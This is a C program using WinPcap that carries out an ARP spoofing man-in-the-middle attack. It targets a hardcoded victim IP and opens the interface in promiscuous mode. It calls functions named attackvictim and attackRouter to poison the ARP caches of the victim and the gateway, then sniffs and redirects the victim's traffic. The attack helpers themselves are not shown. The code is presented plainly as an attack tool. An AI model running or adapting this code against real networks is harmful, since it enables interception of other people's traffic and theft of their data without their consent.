#include "myHeader.h"

int main()
{
	LANINFO LanInfo;
	pcap_if_t *alldevs, *choiceDev;
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char victimIP[16] = "192.168.50.135";

	/* Retrieve the device list from the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}
	choiceDev = ChoiceDev(alldevs);

	/* Get Handle From choice Device */
	handle = pcap_open_live(choiceDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", choiceDev->name, errbuf);
		exit(1);
	}
	/* now, we don't need any more the devices list */
	pcap_freealldevs(alldevs);
	memset(&LanInfo, 0, sizeof(LanInfo));
	/* find Device's GateWay IP address */
	getGateWayAddress(choiceDev, &LanInfo);
	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
	getMACAddress(handle, &LanInfo);
	printf("victim MAC : ");
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.victimMAC[i]);
		else
			printf("%.2X-", LanInfo.victimMAC[i]);
	}
	printf("Gateway MAC : ");
	for (int i = 0; i < 6; i++)
	{
		if (i == 5)
			printf("%.2X\n", LanInfo.gatewayMAC[i]);
		else
			printf("%.2X-", LanInfo.gatewayMAC[i]);
	}
	ARPHEADER TEST_header;
	setArpHeader(&TEST_header);
	attackvictim(handle, &TEST_header, &LanInfo);
	Sleep(500);
	attackRouter(handle, &TEST_header, &LanInfo);
	// sniff packet 
	int res;
	struct pcap_pkthdr* header;
	const u_char* packet;
	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
	{
		if (res == 0)
			continue;
		if (checkARP(handle, packet, &LanInfo))
			continue;
		else
		{
			packetRedirect(handle, header, packet, &LanInfo);
		}
	}
	if (res == -1) {
		printf("Error reading the packets: %s\n", pcap_geterr(handle));
		return -1;
	}
	pcap_close(handle);
	return 0;
}